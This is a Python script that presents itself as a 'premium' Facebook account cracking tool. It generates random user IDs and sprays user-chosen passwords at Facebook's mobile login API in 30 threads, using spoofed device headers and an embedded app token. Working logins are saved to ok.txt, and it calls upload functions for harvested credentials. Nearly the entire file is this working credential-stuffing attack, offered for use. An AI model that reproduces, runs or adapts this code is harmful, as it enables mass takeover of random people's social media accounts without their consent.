# omarsalem4
omarsalem4
W = '\033[97;1m' 

R = '\033[91;1m' 

G = '\033[92;1m' 

Y = '\033[93;1m' 

B = '\033[94;1m'

P = '\033[95;1m'

C = '\033[96;1m'

N = '\x1b[0m'

import os

try:

	import requests

except ImportError:

	os.system("pip install requests")

try:

	import concurrent.futures

except ImportError:

	os.system("pip install futures")

import os

import requests

import sys

import time

import requests

import random

import platform

import base64

import subprocess

from concurrent.futures import ThreadPoolExecutor

try:

	subprocess.run(['play-audio'])

	os.system('clear')

except FileNotFoundError:

	 os.system('pkg install play-audio')

def hacker():

 zxo = Y+" MY NAME ZEYAD \n MY AGE 20 \n WHAT ABOUT YOU ? \n ؟ ﺮﻘﻫ ﺖﻧﺍ ﻞﻫ "

 for letter in zxo:

	 time.sleep(0.04)

	 sys.stdout.write(letter)

	 sys.stdout.flush()

def clear():

	subprocess.run(['clear'])

def runtxt(z):

    for e in z + "\n":

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.03)

def massg():

	os.system('xdg-open t.me/sxtz0')

	mes1= Y+"THIS TOOL CODED BY ZEYAD ALABANY"

	for letter in mes1:

		time.sleep(0.04)

		sys.stdout.write(letter)

		sys.stdout.flush()

def omar():

	os.system('xdg-open https://www.facebook.com/MMAAMMAAMMAAMMAAAAAAAAAAAAAAAA')

	os.system('play-audio om.mp3')

	mes1= Y+"GRETZ TO MY BROTHER OAMR AND ALL MY FRINED"

	for letter in mes1:

		time.sleep(0.04)

		sys.stdout.write(letter)

		sys.stdout.flush()

def helpnote():

	print("%s [*] FOLLOW ME ON Fb TU KNOW ABOUT UPDATES  :)"%(G))

	subprocess.check_output(["am", "start", "github/br5kly"])

	exit(" [*] telegram :  t.me/OMAR_SALRM")

def notice():

 

	runtxt("\n\033[0;91m🧞‍♀️YOU ARE NOT PREMIUM USER ")

	runtxt("\033[0;93m 🔇 SENT THIS KEY TO ADMIN >> %s%s"%(G,basesplit))

	runtxt("\033[0;92m ADMIN🧞‍♀️ WHATSAPP🤲0926279**")

	subprocess.check_output(["am", "start", "+0926297****"])

def irfan():

		

	runtxt("\n\033[0;91m🧞‍This tool is Under maintenance break ")

	runtxt("\n\033[0;91m🧞‍So wait For Update ")

        

	

	

plist = (platform.uname())[2]

basex = plist

basex1 = basex.encode('ascii')

basex2 = base64.b64encode(basex1)

basex3 = basex2.decode('ascii')

base4 = (basex3).upper()

basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')

class Main:

	def __init__(self):

		self.id = []

		self.ok = []

		self.cp = []

		self.loop = 0

		try:

			plr = requests.get('https://pastebin.com/uiJ852NB').text

			if basesplit in plr:

				key = basesplit

				stat = ("\033[0;92mPREMIUM")

				FY = '\033[0;93m'

				FG = '\033[0;92m'

				GET = '\r'

			else:

				key = ("\033[0;91m -")

				stat = ("\033[0;91mFREE USER")

				FY = '\033[0;90m'

				FG = '\033[0;90m'

				GET = '\033[0;92m [P] GET PREMIUM'

		except requests.exceptions.ConnectionError:

			print("\n%s [!] NO INTERNET CONNECTION..\n"%(G))

			exit()

		os.system("clear")

		

		print ("""

'########::'########:::'#######::'##:::'##:

 ##.... ##: ##.... ##:'##.... ##: ##::'##::

 ##:::: ##: ##:::: ##:..::::: ##: ##:'##:::

 ########:: ########:::'#######:: #####::::

 ##.... ##: ##.. ##::::...... ##: ##. ##:::

 ##:::: ##: ##::. ##::'##:::: ##: ##:. ##::

 ########:: ##:::. ##:. #######:: ##::. ##:

........:::..:::::..:::.......:::..::::..::

                                 

\033[41m\033[1;37m[BR3K]   [OMAR]   [ZEYAD ALABANY]   [YOUR-NEXT-PAPA]\x1b[0m

\033[1;32m┌───────────────────────────────────────┐

\033[1;33m│ [✓] AUTHOR   : OMARSALEM        │

\033[1;34m│ [✓] GITHUB   : i,am omar         │

\033[1;35m│ [✓] WHATSAPP :  0926297375 │

\033[1;36m│ [✓] POWER  : \x1b[1;32m GRETZ TO MY BROTHER OMAR \x1b[1;97m           │

\033[1;32m└───────────────────────────────────────┘  

""")

		print("%s [%s•%s] %sTOOL NAME : %sBR3K❌ ZXO ❌"%(G,R,G,B,G))

		print("%s [%s•%s] %sVERSION   : %s2.0"%(G,R,G,B,G))

		print("%s [%s•%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key))

		print("%s [%s•%s] %sSTATUS    : %s"%(G,R,G,B,stat)) 

		print("")

		#print("%s [%s1%s]%s CRACK RANDOM FB ID 2012-15 %s(PRO)"%(R,G,R,Y,G))

		#print("%s [%s2%s]%s CRACK RANDOM FB ID 2011-13 %s(PRO)"%(R,G,R,Y,G))

		#print("%s [%s3%s]%s CRACK RANDOM FB ID 2008-11 %s(PRO)"%(R,G,R,Y,G))

		print(G+"[1] CRACK RANDOM FB ID 2008    (PRO)")

		print(G+"[2] CRACK RANDOM FB ID 2007 %s(PRO) V1")

		print(G+"[3]CRACK RANDOM FB ID 2006 %s(PRO) V2")

		print(G+"[4]CRACK RANDOM FB ID 2005 %s(PRO) V3")

		print(G+"[5] ZEYAD ALABANY TELE AND FACEBOOK")

		print(G+"[6] OMAR FACEBOOK ACCOUNT")

		print(GET)

		hoga = input("\n%s [?] CHOICE : "%(B))

		if hoga in ["", " "]:

			Main()

		#elif hoga in ["1", "01"]:

		#	if basesplit in plr:

		#		self.old_11()

		#	else: 

		#		notice()

		#		exit()

		#elif hoga in ["2", "02"]:

		#	if basesplit in plr:

		#		self.old_11()

		#	else: 

		#		notice()

		#		exit()

		#elif hoga in ["3", "03"]:

		#	if basesplit in plr:

		#		self.shanto9()

		#	else: 

		#		notice()

		#		exit()

		elif hoga in ["1", "01"]:

			if basesplit in plr:

				self.oldcrack()

			else: 

				notice()

				exit()

		elif hoga in ["02", "2"]:

			if basesplit in plr:

				self.old4_7()

			else: 

				notice()

				exit()

		elif hoga in ["3", "03"]:

			if basesplit in plr:

				self.old4_6()

			else: 

				notice()

				exit()

		elif hoga in ["4", "04"]:

			if basesplit in plr:

				self.old4_5()

			else: 

				notice()

				exit()

		elif hoga in ["5", "05"]:

			massg()

			

		elif hoga in ["06", "06"]:

			omar()

			

		##	if basesplit in plr:

		#		self.oldcrack()

		#	else:

		#		notice()

		#		exit()

		#elif hoga in ["P", "p"]:

		#	notice()

		#	exit()

		#else:

		#	Main()

    

	def shanto9(self):

		x = 111111111

		xx = 999999999

		idx = "100000"

		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))

		if (limit)>50000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))

				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))

	def shanto4(self):

		x = 1111111

		xx = 9999999

		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))

		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))

		if (limit)>50000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))

				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))

		

		

	def old4_7(self):

		x = 11111111

		xx = 99999999

		idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))

		#idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])

		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(100000 MAX): \033[0;92m"))

		if (limit)>100000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))

				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(R))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))

	def old4_6(self):

		x = 1111111

		xx = 9999999

		idx = input("%s [+] ENTER A DIGIT (10): %s"%(Y,G))

		#idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])

		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))

		if (limit)>10000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 

				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))

		

		

	def old4_5(self):

		x = 111111

		xx = 999999

		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))

		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])

		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))

		if (limit)>10000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 

				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))

		

	def old_11(self):

		x = 1111111111111

		xx = 9999999999999

		idx = "50000"

		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])

		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))

		if (limit)>10000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))  

				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))

		

		

	def old_13(self):

		x = 1111111111111

		xx = 9999999999999

		idx = "1000"

		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])

		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))

		if (limit)>50000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))  

				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))

	def email(self):

		x = 111

		xx = 999

		nam = input("%s [?] TYPE A NAME %s(EX: Abir): "%(Y,G))

		nam = nam.replace(" ", "")

		print("%s EXAMPLE  : %s@gmail.com, @yahoo.com, @hotmail.com ETC"%(Y,G))

		idx = input("%s DOMAIN  : "%(B))

		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))

		if (limit)>50000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				___ = nam

				self.id.append(___+str(_)+__)

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 

				listpass = input(" [?] ENTER PASSWORD : ")

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULT SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))

		

	def oldcrack(self):

		x = 11111111

		xx = 99999999

		idx = " 13"

		#idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])

		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(500000 MAX): \033[0;92m"))

		if (limit)>500000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))

				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))

		

	def api(self, uid, pwx):

		ua = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.66 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Linux; Android 11; SM-A202F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;]",

							"Mozilla/5.0 (Linux; Android 11; SM-G991B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;]",

		                     "Mozilla/5.0 (Linux; Android 10; SM-A750G Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;]"])

		sys.stdout.write(

			"\r\r %s\033[0;92m[BR3K] : %s/%s - s/%s -> \033[0;92m [OK:%s]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))

		); sys.stdout.flush()

		for pw in pwx:

			pw = pw.lower()

			ses = requests.Session()

			headers = {

				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 

				"x-fb-sim-hni": str(random.randint(20000, 40000)), 

				"x-fb-net-hni": str(random.randint(20000, 40000)), 

				"x-fb-connection-quality": "EXCELLENT",

				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",

				"user-agent": ua, 

				"content-type": "application/x-www-form-urlencoded", 

				"x-fb-http-engine": "Liger"

			}

			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 

			if "session_key" in response.text and "EAAA" in response.text:

				print("\r \033[0;92m[Alamgir-OK] %s|%s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write(" [Alamgir-OK] %s|%s\n"%(uid, pw))

				uploadoks()

				break

			elif "www.facebook.com" in response.json()["error_msg"]:

				print("\r \033[0;91m[Alamgir-CP] %s|%s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write(" [Alamgir-CP] %s|%s\n"%(uid, pw))

				uploadcps()

				break

			else:

				continue

		self.loop +=1

if len(sys.argv) == 2:

	if sys.argv[1] == "--help" or sys.argv[1] == "-h":

		helpnote()

	else:

		Main()
